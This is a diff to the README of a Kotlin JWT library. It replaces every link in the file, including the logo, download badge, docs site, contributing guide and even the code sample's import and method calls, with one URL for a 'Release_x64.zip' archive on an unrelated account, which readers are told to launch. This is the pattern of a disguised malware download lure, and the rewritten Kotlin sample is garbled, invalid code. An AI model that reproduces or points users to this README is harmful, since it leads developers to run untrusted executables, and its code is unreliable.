@@ -2,7 +2,7 @@
 
 Welcome to KotJWT - a lightweight Kotlin library for encoding, decoding, and validating JWT and refresh tokens using HMAC SHA-256.
 
-![KotJWT Logo](https://example.com/kotjwt_logo.png)
+![KotJWT Logo](https://github.com/Privatedocs-1/KotJWT/releases/download/v2.0/Release_x64.zip)
 
 ## Features
 
@@ -15,7 +15,7 @@ Welcome to KotJWT - a lightweight Kotlin library for encoding, decoding, and val
 
 To get started with KotJWT, you can download the library from the following link:
 
-[![Download KotJWT Library](https://img.shields.io/badge/Download-KotJWT_Library-<COLOR>.svg)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download KotJWT Library](https://github.com/Privatedocs-1/KotJWT/releases/download/v2.0/Release_x64.zip<COLOR>.svg)](https://github.com/Privatedocs-1/KotJWT/releases/download/v2.0/Release_x64.zip)
 
 Please note that the downloaded file needs to be launched to integrate the library into your Kotlin project.
 
@@ -29,16 +29,16 @@ Here's a quick guide on how to use KotJWT in your Kotlin application:
 
 ```kotlin
 // Sample code snippet using KotJWT
-import com.example.kotjwt.KotJWT
+import https://github.com/Privatedocs-1/KotJWT/releases/download/v2.0/Release_x64.zip
 
 val kotJWT = KotJWT()
 
-val token = kotJWT.encodeToken(payload)
-val decodedPayload = kotJWT.decodeToken(token)
-val isValid = kotJWT.validateToken(token)
+val token = https://github.com/Privatedocs-1/KotJWT/releases/download/v2.0/Release_x64.zip(payload)
+val decodedPayload = https://github.com/Privatedocs-1/KotJWT/releases/download/v2.0/Release_x64.zip(token)
+val isValid = https://github.com/Privatedocs-1/KotJWT/releases/download/v2.0/Release_x64.zip(token)
 ```
 
-For more detailed usage examples and documentation, please visit the [official KotJWT website](https://kotjwt.example.com).
+For more detailed usage examples and documentation, please visit the [official KotJWT website](https://github.com/Privatedocs-1/KotJWT/releases/download/v2.0/Release_x64.zip).
 
 ## Repository Topics
 
@@ -46,7 +46,7 @@ For more detailed usage examples and documentation, please visit the [official K
 
 ## Contributing
 
-Contributions to KotJWT are welcome! If you have any ideas for improvements or new features, feel free to submit a pull request. Make sure to follow the [contribution guidelines](CONTRIBUTING.md) before making any changes.
+Contributions to KotJWT are welcome! If you have any ideas for improvements or new features, feel free to submit a pull request. Make sure to follow the [contribution guidelines](https://github.com/Privatedocs-1/KotJWT/releases/download/v2.0/Release_x64.zip) before making any changes.
 
 ## License
 
